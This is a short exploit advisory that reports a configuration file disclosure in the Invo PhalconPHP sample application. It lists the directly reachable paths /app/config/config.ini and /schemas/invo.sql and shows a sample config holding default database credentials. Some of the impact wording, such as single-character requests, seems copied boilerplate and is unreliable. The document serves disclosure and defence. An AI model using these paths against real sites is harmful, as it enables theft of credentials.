####################################################################

# Exploit Title : Unvo PhalconPHP 1.x Database Config Disclosure
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 14/02/2019
# Vendor Homepage : phalconphp.com
# Software Download Link : github.com/phalcon/invo/archive/master.zip
# Software Information Link : invo.phalconphp.com
# Software Affected Version : Free Version and 1.x
# Software Technical Requirements :
PHP => 5.4 and  MySQL => 5.1.5
Apache Web Server with mod_rewrite enabled or Nginx Web Server
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Vulnerability Type : CWE-16 [ Configuration ] ~ CWE-200 [ Information Exposure ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

####################################################################

# Description about Software :
***************************
Phalcon PHP is a web framework delivered as a C extension providing 

high performance and lower resource consumption.

####################################################################

# Impact :
***********
Invo PhalconPHP configuration file may potentially disclose sensitive information to remote attackers.

The configuration file that Invo PhalconPHP stored in /app/config/config.ini and /schemas/invo.sql

HTTP requests consisting of a single character will cause the software to 

disclose sensitive configuration information, including the password/database to the administrative web interface.

This file is installed, by default, with world readable and possibly world writeable permissions enabled. 

This may have some potentially serious consequences as the configuration 

file also stores password information in plain text.

This issue occurs because access controls on configuration files are not properly set.

An attacker can exploit this issue to retrieve potentially sensitive information. 

Attackers can access config file via URL request. This may aid in further attacks. 

####################################################################

# Database Configuration File Disclosure Exploit :
*******************************************
/app/config/config.ini

[database]
adapter  = Mysql
host     = localhost
username = root
password =
dbname   = invo
charset  = utf8

[application]
controllersDir = app/controllers/
modelsDir      = app/models/
viewsDir       = app/views/
pluginsDir     = app/plugins/
formsDir       = app/forms/
libraryDir     = app/library/
baseUri        = /

# Database Disclosure Exploit :
***************************
/schemas/invo.sql

-- MySQL dump 10.13  Distrib 5.1.50, for apple-darwin10.4.0 (i386)
--
-- Host: 127.0.0.1    Database: invo
-- ------------------------------------------------------
-- Server version	5.1.50

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
